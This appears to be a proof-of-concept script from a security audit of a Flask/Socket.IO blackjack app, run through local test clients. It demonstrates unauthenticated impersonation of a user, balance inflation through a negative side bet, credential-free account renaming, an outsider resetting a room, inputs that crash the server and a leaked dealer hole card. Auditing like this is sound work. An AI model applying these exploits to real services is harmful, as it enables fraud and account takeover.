import sys, os
os.environ['DATABASE_URL'] = 'sqlite:///' + os.path.join(os.getcwd(), 'e2e.db').replace(chr(92), '/')
sys.path.insert(0, sys.argv[1]); os.chdir(sys.argv[1])
import app as A
from models import User
c = A.app.test_client()
print('register victim', c.post('/api/register', json={'username': 'victim', 'password': 'pw'}).status_code)
print('register x (1-char pw, no username rules)', c.post('/api/register', json={'username': '<b>x</b>', 'password': 'p'}).status_code)
# attacker: no login at all
s = A.socketio.test_client(A.app)
s.emit('create_room', {'username': 'victim', 'solo': True})
room = [m for m in s.get_received() if m['name'] == 'room_created'][0]['args'][0]['room']
s.emit('sit_player', {'room': room, 'username': 'victim', 'seats': [1], 'main_bet': 100, 'pp_bet': -900000, 't3_bet': 0})
s.emit('execute_deal', {'room': room})
st = [m for m in s.get_received() if m['name'] == 'state_update'][-1]['args'][0]
print('unauthenticated socket sat+dealt as victim; state:', st['gameState'], '| hole card in payload:', st['dealerHand']['cards'])
import itertools
for _ in range(30):
    if st['gameState'] == 'insurance': s.emit('buy_insurance', {'room': room, 'seat_number': 1, 'wants_insurance': False})
    elif st['gameState'] == 'playing': s.emit('submit_action', {'room': room, 'username': 'victim', 'action': 'stand'})
    else: break
    st = [m for m in s.get_received() if m['name'] == 'state_update'][-1]['args'][0]
with A.app.app_context():
    print('victim DB balance after one $100 hand with pp_bet=-900000:', User.query.filter_by(username='victim').first().balance)
print('rename victim without credentials:', c.post('/api/account/rename', json={'username': 'victim', 'new_username': 'pwned'}).json)
# second client, never joined the room, drives it
s2 = A.socketio.test_client(A.app)
s2.emit('clear_round', {'room': room}); 
print('outsider (never joined) reset the round; received broadcast:', len(s2.get_received()) > 0, '| table state now:', A.ACTIVE_ROOMS[room].game_state)
try:
    s2.emit('sit_player', {'room': room, 'username': 'pwned', 'seats': [99], 'main_bet': 100, 'pp_bet': 0, 't3_bet': 0})
    print('seat 99 accepted?')
except Exception as e:
    print('sit_player seats=[99] -> unhandled server exception:', type(e).__name__)
try:
    s2.emit('sit_player', {'room': room, 'username': 'pwned', 'seats': [1], 'main_bet': 'abc'})
except Exception as e:
    print('sit_player main_bet="abc" -> unhandled server exception:', type(e).__name__)
print('async_mode:', A.socketio.async_mode, '| rooms held in memory forever:', len(A.ACTIVE_ROOMS))
